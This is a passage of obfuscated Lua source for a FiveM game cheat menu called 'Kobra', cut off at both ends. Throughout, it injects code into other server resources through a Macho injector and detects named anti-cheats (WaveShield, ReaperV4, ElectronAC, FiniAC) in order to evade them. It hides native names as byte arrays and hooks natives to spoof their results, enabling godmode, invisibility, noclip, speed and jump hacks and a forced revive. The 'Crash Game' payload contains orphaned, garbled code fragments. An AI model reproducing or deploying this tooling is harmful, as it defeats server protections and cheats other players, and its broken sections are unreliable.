                                    ]]);end end,["mc9-medicsystem"]=function() local v762=0 + 0 ;local v763;local v764;while true do if (1==v762) then v764=GetResourceState("ReaperV4")=="started" ;if v763 then MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);elseif v764 then MachoInjectThread(0 -0 ,"mc9-medicsystem","",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);else MachoInjectResourceRaw("mc9-medicsystem",[[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]]);end break;end if (v762==0) then print("1");v763=GetResourceState("WaveShield")=="started" ;v762=1 + 0 ;end end end};for v765,v766 in pairs(v342) do if (GetResourceState(v765)=="started") then v766();end end break;end end end},{type="slider",label="Health",desc="This will set your health to the desired amount.",scrollType="onEnter",value=49 + 51 ,min=0,max=100,step=1,onSelect=function(v343) SetEntityHealth(PlayerPedId(),v343 + 100 );end},{type="slider",label="Armour",desc="This will set your armour to the desired amount.",scrollType="onEnter",value=100,min=0,max=90 + 10 ,step=495 -(64 + 430) ,onSelect=function(v344) SetPedArmour(PlayerPedId(),v344);end},{type="button",label="Refill Health",desc="This will refill your health to the maximum value.",onSelect=function() SetEntityHealth(PlayerPedId(),GetEntityMaxHealth(PlayerPedId()));end},{type="button",label="Refill Armour",desc="This will refill your armour to the maximum value.",onSelect=function() SetPedArmour(PlayerPedId(),100);end},{type="checkbox",label="Godmode",checked=false,desc="This will give your player godmode.",onSelect=function(v345) v281:HandleGodmodeToggle(v345);end},{type="checkbox",label="Invisibility",checked=false,desc="This will make your player invisible.",onSelect=function(v346) if v346 then v281:EnableInvisibility();else v281:DisableInvisibility();end end},{type="divider",label="Movement"},{type="slider-checkbox",label="Noclip",scrollType="onScroll",checked=false,value=0.25,step=0.25 -0 ,min=1658.25 -(256 + 1402) ,max=1904 -(30 + 1869) ,onSelect=function(v347,v348) if v348 then local v579=1369 -(213 + 1156) ;while true do if ((188 -(96 + 92))==v579) then if  not v29 then local v974=0;while true do if ((1 + 0)==v974) then v29=true;break;end if (v974==0) then v12:Notify("info","Kobra","Initializing... Please wait!",1899 -(142 + 757) );Wait(326 + 74 );v974=1;end end end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                _G.KobraNoclipSpeed = ]]   .. v347   .. [[
                                if not _G.KobraNoclipThreadRunning then
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.KobraNoclipThreadRunning do
                                            Wait(0)
                                            if not _G.KobraNoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.KobraNoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipSpeed = ]]   .. v347   .. [[
                                end
                            ]] );elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(2 + 1 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v347   .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.KobraNoclipSpeed or ]]   .. v347   .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v347   .. [[
                                            end
                                        ]] );else MachoInjectResource2(3,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipSpeed = ]]   .. v347   .. [[
                                            if not _G.KobraNoclipThreadRunning then
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.KobraNoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.KobraNoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.KobraNoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipSpeed = ]]   .. v347   .. [[
                                            end
                                        ]] );end break;end end elseif (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                    _G.KobraNoclipEnabled = false
                                    _G.KobraNoclipThreadRunning = false
                                ]]);elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(82 -(32 + 47) ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipEnabled = false
                                            _G.KobraNoclipThreadRunning = false
                                        ]]);end end},{type="slider-checkbox",label="Freecam",scrollType="onScroll",checked=false,value=0.25 + 0 ,step=0.25 -0 ,min=1648.25 -(685 + 963) ,max=5,onSelect=function(v349,v350) v281:ToggleFreecam(v350,v349);end},{type="checkbox",label="Fast Run",checked=false,onSelect=function(v351) if v351 then local v580=0 -0 ;while true do if (v580==0) then v12:Notify("success","Kobra","Fast Run On",3000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]);end break;end end else local v581=1709 -(541 + 1168) ;while true do if (v581==(1597 -(645 + 952))) then v12:Notify("error","Kobra","Fast Run Off",3838 -(669 + 169) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]]);end break;end end end end},{type="checkbox",label="Super Jump",checked=false,onSelect=function(v352) local v353=0 -0 ;local v354;local v355;local v356;local v357;local v358;while true do if (v353==(2 + 1)) then function v357() if  not _G.superJumpEnabled then local v897=0;while true do if (v897==(0 + 0)) then _G.superJumpEnabled=true;v356({1462 -(665 + 730) ,114,101,197 -100 ,1466 -(540 + 810) ,277 -176 ,67 + 17 ,307 -(166 + 37) ,114,1873 -(843 + 929) ,97,877 -(55 + 722) })(function() while _G.superJumpEnabled do local v1302=0 -0 ;while true do if (v1302==(1675 -(78 + 1597))) then v356({83,92 + 9 ,665 -(305 + 244) ,188 -(95 + 10) ,83 + 34 ,112,101,876 -(592 + 170) ,74,55 + 62 ,43 + 66 ,19 + 93 ,155 -71 ,104,105,157 -42 ,70,90 + 24 ,65 + 32 ,205 -96 ,101})(v356({80,108,193 -96 ,121,271 -170 ,1197 -(1038 + 45) ,303 -(19 + 211) ,100})());Wait(0 -0 );break;end end end end);break;end end end end v358=nil;v353=4;end if (v353==(1 + 0)) then function v355(v767) local v768=0 + 0 ;local v769;while true do if (v768==(1036 -(1007 + 29))) then v769="";for v1035=1 + 0 , #v767 do v769=v769   .. string.char(v767[v1035]) ;end v768=1;end if (1==v768) then return v769;end end end v356=nil;v353=4 -2 ;end if (v353==(9 -7)) then function v356(v770) return _G[v355(v770)];end v357=nil;v353=1 + 2 ;end if (0==v353) then v354=GetResourceState("WaveShield")=="started" ;v355=nil;v353=812 -(340 + 471) ;end if (v353==4) then function v358() local v771=0 -0 ;while true do if (v771==(589 -(276 + 313))) then _G.superJumpEnabled=false;v356({77 + 6 ,10 + 91 ,116,248 -165 ,520 -(342 + 61) ,112,101,279 -(4 + 161) ,232 -158 ,307 -190 ,606 -(322 + 175) ,112,647 -(173 + 390) ,26 + 78 ,419 -(203 + 111) ,8 + 107 ,204 -134 ,114,481 -(328 + 56) ,109,613 -(433 + 79) })(v356({80,10 + 98 ,325 -228 ,89 + 32 ,1137 -(562 + 474) ,232 -118 ,73,1773 -(1506 + 167) })(),1 -0 );break;end end end if v352 then if v354 then v357();else MachoInjectResourceRaw("any",[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]]);end elseif v354 then print("off");v358();else MachoInjectResourceRaw("any",[[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]]);end break;end end end}}},{label="Miscellaneous",tabs={{icon="",type="button",label="Crash Game",desc="Crashes your game",onSelect=function() MachoInjectResourceRaw("any",[[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]]);end},{icon="",type="button",label="Clear Screen Effects",desc="Removes all screen effects",onSelect=function() print("Revive");end},{icon="",type="button",label="Suicide",desc="This will kill you.",onSelect=function() local v359=0;local v360;while true do if (v359==(0 -0)) then v360=nil;function v360() local v772=SetEntityHealth;v772(PlayerPedId(),337 -(258 + 79) );end v359=1 + 0 ;end if (v359==1) then v360();break;end end end},{icon="",type="button",label="Force Ragdoll",desc="This will ragdoll.",onSelect=function() MachoInjectResourceRaw("any",[[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]]);end},{icon="",type="button",label="Remove Crutch",desc="Remove Crutch is the server is using the correct resource",onSelect=function() MachoResourceStop("wasabi_crutch");end},{icon="",type="scrollable",value=1,values={"Primary","Secondary"},label="Clear Tasks",desc="Clears the character's tasks",onSelect=function(v361) if (v361=="Primary") then ClearPedTasksImmediately(PlayerPedId());elseif (v361=="Secondary") then ClearPedSecondaryTask(PlayerPedId());end end},{type="divider",label="Toggles"},{type="checkbox",label="No Ragdoll",checked=false,desc="This will prevent you from being ragdolled from admins or cheaters.",onSelect=function(v362) local v363=GetResourceState("WaveShield")=="started" ;local v364=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v362 then if v363 then local v773=58 -(34 + 24) ;while true do if (v773==(0 + 0)) then v12:Notify("success","Kobra","No Ragdoll Enabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]]);break;end end else v48(v364,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
